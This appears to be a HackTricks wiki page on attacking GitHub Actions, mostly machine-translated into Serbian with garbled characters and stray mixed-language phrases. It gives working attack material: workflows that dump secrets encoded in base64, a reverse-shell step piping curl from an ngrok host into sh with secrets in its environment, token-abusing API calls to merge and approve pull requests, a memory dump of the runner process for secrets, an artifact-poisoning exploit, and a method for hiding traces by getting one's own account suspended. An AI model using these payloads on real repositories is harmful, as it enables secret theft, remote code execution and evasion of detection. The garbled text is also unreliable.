# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **Uk stealing** the **tajne podatke** from that repo/organization.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privilegije** to access other platforms such as AWS and GCP.
* **Execute code in custom workers** (if custom workers are used) and try to pivot from there.
* **Overwrite** repository **code**.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **Compromise** **deployments** and other **artifacts**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**tajna**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Odobri PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Kreiraj PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Imajte na umu da 캖ete u nekoliko slu캜ajeva mo캖i da prona캠ete **github korisni캜ke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu dati vi코e privilegija nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>Lista tajni u Github Action izlazu</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverzne ljuske sa tajnama</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Mogu캖e je proveriti dozvole date Github Token-u u drugim korisni캜kim repozitorijumima **proverom logova** akcija:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljena Izvr코enja

{% hint style="info" %}
Ovo bi bio najlak코i na캜in da se kompromituju Github akcije, jer ovaj slu캜aj podrazumeva da imate pristup **kreiranju novog repozitorijuma u organizaciji**, ili imate **prava pisanja nad repozitorijumom**.

Ako ste u ovom scenariju, mo쬰te samo proveriti [Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Izvr코enje iz Kreiranja Repozitorijuma

U slu캜aju da 캜lanovi organizacije mogu **kreirati nove repozitorijume** i mo쬰te izvr코avati github akcije, mo쬰te **kreirati novi repozitorijum i ukrasti tajne postavljene na nivou organizacije**.

### Izvr코enje iz Nove Grane

Ako mo쬰te **kreirati novu granu u repozitorijumu koji ve캖 sadr쬴 konfigurisan Github Action**, mo쬰te ga **modifikovati**, **otpremiti** sadr쬬j, a zatim **izvr코iti tu akciju iz nove grane**. Na ovaj na캜in mo쬰te **izvu캖i tajne na nivou repozitorijuma i organizacije** (ali morate znati kako se zovu).

Mo쬰te u캜initi da modifikovana akcija bude izvr코na **ru캜no,** kada se **kreira PR** ili kada se **neki kod otpremi** (u zavisnosti od toga koliko 쬰lite da budete uo캜ljivi):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forkovana Izvr코enja

{% hint style="info" %}
Postoje razli캜iti okida캜i koji bi mogli omogu캖iti napada캜u da **izvr코i Github akciju iz drugog repozitorijuma**. Ako su ti okida캜i lo코e konfigurisani, napada캜 bi mogao da ih kompromituje.
{% endhint %}

### `pull_request`

Okida캜 radnog toka **`pull_request`** 캖e izvr코iti radni tok svaki put kada se primi pull request uz neke izuzetke: po defaultu, ako je to **prvi put** da **saradjujete**, neki **odr쬬vaoc** 캖e morati da **odobri** **izvr코enje** radnog toka:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Po코to je **podrazumevano ograni캜enje** za **prvake** u doprinosima, mogli biste doprineti **ispravljanjem va쬰캖e gre코ke/typo** i zatim poslati **druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da kreirate nalog sa imenom nekoga ko je doprineo projektu i obrisao njegov nalog.~~
{% endhint %}

Pored toga, po defaultu **spre캜ava pisane dozvole** i **pristup tajnama** ciljanom repozitorijumu kao 코to je pomenuto u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Sa izuzetkom `GITHUB_TOKEN`, **tajne se ne prosle캠uju izvr코iocu** kada se radni tok pokrene iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima dozvole samo za 캜itanje** u pull request-ima **iz forkovanih repozitorijuma**.

Napada캜 bi mogao da izmeni definiciju Github akcije kako bi izvr코io proizvoljne stvari i dodao proizvoljne akcije. Me캠utim, ne캖e mo캖i da ukrade tajne ili prepi코e repozitorijum zbog pomenutih ograni캜enja.

{% hint style="danger" %}
**Da, ako napada캜 promeni u PR-u github akciju koja 캖e biti pokrenuta, njegova Github akcija 캖e biti ta koja 캖e se koristiti, a ne ona iz originalnog repozitorijuma!**
{% endhint %}

Po코to napada캜 tako캠e kontroli코e kod koji se izvr코ava, 캜ak i ako nema tajni ili pisanih dozvola na `GITHUB_TOKEN`, napada캜 bi mogao, na primer, **da otpremi zlonamerne artefakte**.

### **`pull_request_target`**

Okida캜 radnog toka **`pull_request_target`** ima **pisane dozvole** za ciljani repozitorijum i **pristup tajnama** (i ne tra쬴 dozvolu).

Napomena: okida캜 radnog toka **`pull_request_target`** **izvr코ava se u osnovnom kontekstu** i ne u onom koji daje PR (da **ne izvr코ava nepouzdani kod**). Za vi코e informacija o `pull_request_target` [**proverite dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Pored toga, za vi코e informacija o ovoj specifi캜noj opasnoj upotrebi proverite ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Mo쬰 izgledati kao da je **izvr코eni radni tok** onaj definisan u **osnovi** i **ne u PR-u**, pa je **sigurno** koristiti **`pull_request_target`**, ali postoje **neki slu캜ajevi kada to nije**.

A ovaj 캖e imati **pristup tajnama**.

### `workflow_run`

Okida캜 [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omogu캖ava pokretanje radnog toka iz drugog kada je `zavr코en`, `tra쬰n` ili `u_procesu`.

U ovom primeru, radni tok je konfiguran da se izvr코i nakon 코to se zavr코i odvojeni "Pokreni testove" radni tok:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: Workflow pokrenut doga캠ajem `workflow_run` mo쬰 **pristupiti tajnama i pisati tokene, 캜ak i ako prethodni workflow nije**.

Ova vrsta workflow-a mo쬰 biti napadnuta ako **zavisi** od **workflow-a** koji mo쬰 biti **pokrenut** od strane spoljnog korisnika putem **`pull_request`** ili **`pull_request_target`**. Nekoliko ranjivih primera mo쬰 se [**prona캖i u ovom blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi se sastoji od **`workflow_run`** pokrenutog workflow-a koji preuzima napada캜ev kod: `${{ github.event.pull_request.head.sha }}`\
Drugi se sastoji od **prosle캠ivanja** **artifact-a** iz **nepouzdanog** koda u **`workflow_run`** workflow i kori코캖enja sadr쬬ja ovog artifact-a na na캜in koji ga 캜ini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvr코ava iz pull\_request-a kori코캖eni/preuzeti kod dolazi iz originala ili iz fork-ovanog PR-a

## Zloupotreba Forkovane Izvr코avanja

Pomenuli smo sve na캜ine na koje spolja코nji napada캜 mo쬰 uspeti da pokrene github workflow, sada hajde da pogledamo kako ove izvr코avanja, ako su lo코e konfigurisane, mogu biti zloupotrebljene:

### Nepouzdan checkout izvr코avanje

U slu캜aju **`pull_request`,** workflow 캖e biti izvr코en u **kontekstu PR-a** (tako da 캖e izvr코iti **maliciozni kod PR-a**), ali neko mora prvo da **autorizuje** i bi캖e izvr코en sa nekim [ograni캜enjima](./#pull\_request).

U slu캜aju workflow-a koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od workflow-a koji mo쬰 biti pokrenut iz **`pull_request_target` ili `pull_request`**, kod iz originalnog repozitorijuma 캖e biti izvr코en, tako da **napada캜 ne mo쬰 kontrolisati izvr코eni kod**.

{% hint style="danger" %}
Me캠utim, ako **akcija** ima **eksplicitni PR checkout** koji 캖e **uzeti kod iz PR-a** (a ne iz osnove), koristi캖e napada캜ev kontrolisani kod. Na primer (proverite liniju 12 gde se preuzima kod PR-a):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NESIGURNO. Pru쬰no samo kao primer.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Hvala!
</code></pre>

Potencijalno **nepouzdan kod se izvr코ava tokom `npm install` ili `npm build`** jer su skripte za izgradnju i referencirane **pakete kontrolisani od strane autora PR-a**.

{% hint style="warning" %}
Github dork za pretragu ranjivih akcija je: `event.pull_request pull_request_target extension:yml` me캠utim, postoje razli캜iti na캜ini za konfiguraciju poslova da se izvr코avaju sigurno 캜ak i ako je akcija konfigurisana nesigurno (kao 코to je kori코캖enje uslovnih izraza o tome ko je akter koji generi코e PR).
{% endhint %}

### Kontekst Injekcije Skripti <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Napomena da postoje odre캠eni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) 캜ije vrednosti su **kontrolisane** od strane **korisnika** koji kreira PR. Ako github akcija koristi te **podatke za izvr코avanje bilo 캜ega**, to mo쬰 dovesti do **izvr코avanja proizvoljnog koda:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Injekcija Skripti** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Iz dokumenata: Mo쬰te u캜initi **promenljivu okru쬰nja dostupnom za sve naredne korake** u workflow poslu tako 코to 캖ete definisati ili a쬿rirati promenljivu okru쬰nja i napisati ovo u **`GITHUB_ENV`** datoteku okru쬰nja.

Ako bi napada캜 mogao **ubaciti bilo koju vrednost** unutar ove **env** promenljive, mogao bi ubaciti env promenljive koje bi mogle izvr코iti kod u slede캖im koracima kao 코to su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovo**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovo**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje da je uploadovani artifact da 캜uva svoj sadr쬬j unutar **`GITHUB_ENV`** env promenljive. Napada캜 bi mogao da uploaduje ne코to poput ovoga da bi ga kompromitovao:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Ranjive Tre캖e Strane Github Akcije

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao 코to je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github Akcija omogu캖ava pristup artifact-ima iz razli캜itih workflow-a i 캜ak repozitorijuma.

Problem je u tome 코to ako **`path`** parametar nije postavljen, artifact se ekstrahuje u trenutni direktorijum i mo쬰 prepisati datoteke koje bi mogle biti kasnije kori코캖ene ili 캜ak izvr코ene u workflow-u. Stoga, ako je Artifact ranjiv, napada캜 bi mogao da zloupotrebi ovo da kompromituje druge workflow-e koji veruju Artifact-u.

Primer ranjivog workflow-a:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto ovim radnim tokom:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Drugi Spoljni Pristup

### Otimanje Izbrisanog Namespace Repozitorijuma

Ako nalog promeni svoje ime, drugi korisnik bi mogao da registruje nalog sa tim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github 캖e omogu캖iti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj koji je izbrisan.

{% hint style="danger" %}
Dakle, ako neka akcija koristi repozitorijum sa nepostoje캖eg naloga, jo코 uvek je mogu캖e da napada캜 mo쬰 da kreira taj nalog i kompromituje akciju.
{% endhint %}

Ako su drugi repozitorijumi koristili **zavisnosti iz ovih korisni캜kih repozitorijuma**, napada캜 캖e mo캖i da ih otme. Ovde imate potpunije obja코njenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivotiranje

{% hint style="info" %}
U ovom odeljku 캖emo govoriti o tehnikama koje bi omogu캖ile **pivotiranje sa jednog repozitorijuma na drugi** pod pretpostavkom da imamo neku vrstu pristupa prvom (proverite prethodni odeljak).
{% endhint %}

### Trovanje Ke코om

Ke코 se odr쬬va izme캠u **izvr코avanja radnih tokova u istoj grani**. 맚o zna캜i da ako napada캜 **kompromituje** **paket** koji se zatim 캜uva u ke코u i **preuzima** i izvr코ava ga **privilegovaniji** radni tok, on 캖e mo캖i da **kompromituje** i taj radni tok.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje Artefaktima

Radni tokovi mogu koristiti **artefakte iz drugih radnih tokova i 캜ak repozitorijuma**, ako napada캜 uspe da **kompromituje** Github Akciju koja **otprema artefakt** koji se kasnije koristi od strane drugog radnog toka, on bi mogao da **kompromituje druge radne tokove**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Eksploatacija iz Akcije

### Pristupanje AWS-u i GCP-u putem OIDC

Proverite slede캖e stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristupanje tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadr쬬j u skriptu, zanimljivo je znati kako mo쬰te pristupiti tajnama:

* Ako je tajna ili token postavljen na **promenljivu okru쬰nja**, mo쬰 se direktno pristupiti kroz okru쬰nje koriste캖i **`printenv`**.

<details>

<summary>Lista tajni u izlazu Github Akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverzne ljuske sa tajnama</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript se 캜uva **na disku** i mo쬰 se pristupiti.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript akcije, tajne se 코alju kroz promenljive okru쬰nja.
* ```bash
ps axe | grep node
```
*   Za **prilago캠enu akciju**, rizik mo쬰 varirati u zavisnosti od toga kako program koristi tajnu koju je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba samostalnih pokreta캜a

Na캜in da se prona캠e koje **Github akcije se izvr코avaju u ne-github infrastrukturi** je pretraga za **`runs-on: self-hosted`** u konfiguraciji yaml za Github akcije.

**Samostalni** pokreta캜i mogu imati pristup **dodatnim osetljivim informacijama**, drugim **mre쬹im sistemima** (ranjivi krajnji ta캜ki u mre쬴? usluga metapodataka?) ili, 캜ak i ako je izolovan i uni코ten, **vi코e od jedne akcije mo쬰 biti pokrenuto u isto vreme** i zlonamerna mo쬰 **ukrasti tajne** druge.

U samostalnim pokreta캜ima tako캠e je mogu캖e dobiti **tajne iz \_Runner.Listener**\_\*\* procesa\*\* koji 캖e sadr쬬ti sve tajne radnih tokova u bilo kojem koraku dumpovanjem njegove memorije:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Proverite [**ovaj post za vi코e informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Mogu캖e je napraviti Github akcije koje 캖e **izgraditi i sa캜uvati Docker sliku unutar Github-a**.\
Primer se mo쬰 na캖i u slede캖em pro코irivom:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao 코to ste mogli videti u prethodnom kodu, Github registry je hostovan na **`ghcr.io`**.

Korisnik sa pravima 캜itanja nad repozitorijumom 캖e mo캖i da preuzme Docker sliku koriste캖i li캜ni pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Osetljive informacije u Github Actions logovima

캛ak i ako **Github** poku코ava da **otkrije tajne vrednosti** u logovima akcija i **izbegne da ih prika쬰**, **dati osetljivi podaci** koji su mogli biti generisani tokom izvr코enja akcije ne캖e biti sakriveni. Na primer, JWT potpisan tajnom vredno코캖u ne캖e biti sakriven osim ako nije [specifi캜no konfigurisano](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Sakrivanje tragova

(Teknika iz [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki PR koji je podnet je jasno vidljiv javnosti na Github-u i ciljanom GitHub nalogu. Na GitHub-u po defaultu, **ne mo쬰mo obrisati PR sa interneta**, ali postoji obrt. Za GitHub naloge koji su **suspendovani** od strane GitHub-a, svi njihovi **PR-ovi se automatski bri코u** i uklanjaju sa interneta. Dakle, da biste sakrili svoju aktivnost, potrebno je da ili dobijete **suspendovan GitHub nalog ili da vam nalog bude ozna캜en**. Ovo bi **sakrilo sve va코e aktivnosti** na GitHub-u sa interneta (u su코tini uklonilo sve va코e exploit PR-ove)

Organizacija na GitHub-u je veoma proaktivna u izve코tavanju naloga GitHub-u. Sve 코to treba da uradite je da podelite "neke stvari" u Issue i oni 캖e se pobrinuti da va코 nalog bude suspendovan za 12 sati :p i eto, u캜inili ste svoj exploit nevidljivim na github-u.

{% hint style="warning" %}
Jedini na캜in za organizaciju da sazna da su bili meta je da proveri GitHub logove iz SIEM-a, jer bi iz GitHub UI PR bio uklonjen.
{% endhint %}

## Alati

Slede캖i alati su korisni za pronala쬰nje Github Action radnih tokova i 캜ak pronala쬰nje ranjivih:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
